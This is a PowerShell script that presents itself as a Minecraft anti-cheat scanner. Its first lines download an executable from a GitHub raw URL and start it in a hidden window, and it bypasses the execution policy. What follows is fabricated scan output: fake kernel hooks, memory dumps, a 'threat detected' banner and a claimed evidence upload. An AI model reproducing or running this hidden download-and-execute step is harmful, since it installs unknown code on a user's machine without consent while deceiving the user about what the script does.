# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

Clear-Host
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "Green"
Clear-Host

Write-Host "root@anticheat-node-47:~# " -NoNewline -ForegroundColor Green
Start-Sleep -Milliseconds 400
Write-Host "initiate client_integrity_scan --target minecraft.exe --deep" -ForegroundColor White

Write-Host ""
Write-Host "[KERNEL] Loading sigdb_v9.4.1 ... done" -ForegroundColor DarkGreen
Write-Host "[R0] Ring-0 hook established" -ForegroundColor DarkGreen
Start-Sleep -Milliseconds 1200

Write-Host ""
Write-Host "  00000000  4D 5A 90 00 03 00 00 00  04 00 00 00 FF FF 00 00   MZ............." -ForegroundColor DarkGreen
Write-Host "  00000010  B8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00   ........@......." -ForegroundColor DarkGreen
Write-Host "[MEM] Base address mapped @ 0x7FF6A1230000" -ForegroundColor Green
Start-Sleep -Seconds 3

Write-Host ""
Write-Host "Scanning memory regions..." -NoNewline
for ($i=1; $i -le 45; $i++) {
    Write-Host "." -NoNewline -ForegroundColor DarkGreen
    Start-Sleep -Milliseconds (Get-Random -Min 1800 -Max 3200)
}
Write-Host " [DONE]" -ForegroundColor Green

Write-Host "[SIG] Pattern scan (aob) ... 81 ? ? ? ? ? 48 8B ? ? ? ? ? E8" -ForegroundColor Yellow
Write-Host "[SIG] Match found @ offset +0x1A37F8 (可能性: 98.7%)" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "Dumping suspected module headers..." -ForegroundColor White
Write-Host "  Module: unknown_x64.dll" -ForegroundColor Yellow
Write-Host "  Hash: SHA256 → 4b7e9f2c1a8d3e5f6091b2c4d8e7f901a2b3c4d5e6f78901a2b3c4d5e6f7" -ForegroundColor DarkRed
Write-Host "  Entropy: 7.892  ← highly suspicious" -ForegroundColor Red
Start-Sleep -Seconds 4

Write-Host ""
Write-Host "[BEHAVIOR] Hook detection: DirectX Present hooked" -ForegroundColor Red
Write-Host "[BEHAVIOR] Injected thread detected (TID 0x1A4C)" -ForegroundColor Red
Write-Host "[BEHAVIOR] WriteProcessMemory calls from external process" -ForegroundColor Red
Start-Sleep -Seconds 5

Write-Host ""
Write-Host "root@anticheat-node-47:~# " -NoNewline -ForegroundColor Green
Write-Host "scan_status" -ForegroundColor White
Start-Sleep -Milliseconds 900

Write-Host ""
Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "║          ! ! !  THREAT DETECTED  ! ! !     ║" -ForegroundColor Red
Write-Host "║  Type     : User-mode code injection       ║" -ForegroundColor Yellow
Write-Host "║  Family   : Matrix/Aristois/Wurst variant  ║" -ForegroundColor Yellow
Write-Host "║  Confidence: 99.4%                          ║" -ForegroundColor Red
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red

Write-Host ""
Write-Host "[LOG] Report generated → /var/log/cheat_detections/2026-03-04_1423_player_$env:USERNAME" -ForegroundColor DarkGreen
Write-Host "[NET] Uploading evidence packet ... done" -ForegroundColor DarkGreen

Write-Host ""
Write-Host "root@anticheat-node-47:~# " -NoNewline -ForegroundColor Green
Write-Host "_"

# Чтобы окно не закрывалось сразу
Write-Host "`nPress any key to exit terminal..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
